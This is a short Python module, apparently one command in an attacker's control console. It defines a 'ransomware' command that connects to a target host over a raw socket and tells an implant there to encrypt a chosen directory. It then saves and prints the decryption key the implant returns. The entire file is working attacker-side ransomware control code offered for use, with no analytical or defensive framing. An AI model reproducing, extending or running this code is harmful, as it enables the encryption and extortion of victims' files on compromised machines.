from ..commands import Command
import socket
import os

TARGET_PORT = 5050
KEY_FILE = "ransom.key"


def send_command(target: str, command: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target, TARGET_PORT))
        s.sendall(command.encode("utf-8"))
        return s.recv(4096).decode("utf-8", errors="replace")


def encrypt_files(target: str, directory: str) -> None:
    print(f"[*] Sending encryption command for: {directory}")
    response = send_command(target, f"run_encrypt {directory}")

    if response.startswith("KEY:"):
        parts = response.split("|")
        key = parts[0][4:]                                      # strip "KEY:"
        count = parts[1].split(":")[1] if len(parts) > 1 else "unknown"

        with open(KEY_FILE, "w") as f:
            f.write(key)

        print(f"[+] Encrypted {count} file(s).")
        print(f"[+] Key saved to {KEY_FILE}")
        print(f"[+] Key: {key}")
    else:
        print(f"[-] Unexpected response: {response}")


class ransomware(Command):
    """
    Encrypt target files and retrieve the decryption key.
    Usage: ransomware <target> <directory>
    """
    def do_command(self, lines: str):
        parts = lines.split()
        if len(parts) < 2:
            print("Usage: ransomware <target> <directory>")
            return
        encrypt_files(parts[0], parts[1])


command = ransomware